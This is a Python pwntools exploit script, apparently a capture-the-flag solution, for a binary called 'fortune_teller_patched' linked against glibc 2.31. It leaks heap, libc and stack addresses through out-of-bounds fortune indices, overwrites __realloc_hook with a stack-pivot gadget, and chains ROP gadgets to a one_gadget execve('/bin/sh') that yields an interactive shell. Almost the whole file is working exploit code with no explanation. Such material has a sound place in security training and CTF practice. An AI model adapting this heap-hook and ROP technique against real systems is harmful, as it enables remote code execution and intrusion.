#!/usr/bin/env python3

from distutils import log
from operator import add
from pwn import *

exe = ELF("./fortune_teller_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEB:
            gdb.attach(r,gdbscript="""
                       b *dispatch+367
                       b *read_random_message+283
                       b *dispatch+284
                       b *dispatch+0x016f
                       c
                       """)
    else:
        r = remote("addr", 1337)

    return r

def random_fortune(r, len):
    r.sendlineafter(b": ", b"0 " + len)
    pass

def display_fortune(r):
    r.sendlineafter(b": ", b"1")
    pass

def choose_fortune(r, index):
    r.sendlineafter(b": ", b"2 " + index)
    pass

def overwrite_fortune(r, len, data):
    r.sendlineafter(b": ", b"3 " + len + b" " + data)
    pass

def main():
    r = conn()

    size = 100

    # Useless heap leak
    choose_fortune(r, b"-2")
    display_fortune(r)
    r.recvuntil(b"reads: ")
    leaked = r.recv(7).strip(b"\n").ljust(8, b"\x00")
    leaked_addr = u64(leaked)
    heap_offset = 0x5bb6bc08d2a0 - 0x00005bb6bc08d000
    heap_address = leaked_addr - heap_offset
    log.success(f"Leaked heap address: {hex(leaked_addr)}")
    log.success(f"Heap base address: {hex(heap_address)}")

    # this hits like 20% of the time which is good enough for me
    choose_fortune(r, b"-150")
    display_fortune(r)
    r.recvuntil(b"reads: ")
    leaked = r.recv(6).strip(b"\n").ljust(8, b"\x00")
    offset = 0x74dffb4b13c0 - 0x000074dffb2c4000
    leaked_addr = u64(leaked)
    libc.address = leaked_addr - offset
    log.success(f"Leaked libc address: {hex(leaked_addr)}")
    log.success(f"Leaked libc address: {hex(libc.address)}")
    log.info(f'malloc hook @ {hex(libc.sym.__realloc_hook)}')
    one_gadget = 0xe3afe + libc.address # execve("/bin/sh", r15, r12)
    log.info(f'onegadget @ {hex(one_gadget)}')
    LEAVE_Gadget = 0x00000000000578c8 + libc.address # leave ; ret
    POP_R12_Gadget = 0x000000000002f709 + libc.address # pop r12 ; ret
    ADD_RSP_Gadget = 0x0000000000052c07 + libc.address # add rsp, 0xd8 ; ret
        
    log.info(f'LEAVE Gadget @ {hex(LEAVE_Gadget)}')
    log.info(f'POP RBP Gadget @ {hex(ADD_RSP_Gadget)}')

    # useless stack leak
    choose_fortune(r, b"51")
    display_fortune(r)
    r.recvuntil(b"reads: ")
    leaked = r.recv(6).strip(b"\n").ljust(8, b"\x00")
    leaked_addr = u64(leaked)
    stack_offset = 0x7ffcaca6e017 - 0x00007ffcaca4d000
    stack_base = leaked_addr - stack_offset
    target_address_offset = 0x00007ffd02515c50 - 0x00007ffd024f5000
    stack_target = stack_base + target_address_offset
    log.success(f"Leaked stack address: {hex(leaked_addr)}")
    log.success(f"Stack base address: {hex(stack_base)}")
    log.success(f"Stack target address: {hex(stack_target)}")

    # overwrite realloc hook with rsp gadget to pivot to stack
    choose_fortune(r, b"60")
    overwrite_fortune(r, str(size).encode() , p64(libc.sym.__realloc_hook) + b"B" * 72)

    choose_fortune(r, b"61")
    overwrite_fortune(r, str(size).encode() , p64(ADD_RSP_Gadget))
    display_fortune(r)
    
    choose_fortune(r, b"-2")

    # create rop chain
    overwrite_fortune(r, str(0x38).encode() , b"B" * 0x30 + p64(one_gadget))
    overwrite_fortune(r, str(0x30).encode() , b"B" * 0x28 + p64(0x0))
    overwrite_fortune(r, str(0x28).encode() , b"B" * 0x20 + p64(POP_R12_Gadget))

    r.sendlineafter(b": ", b"A"*5000)
    r.interactive()


if __name__ == "__main__":
    main()
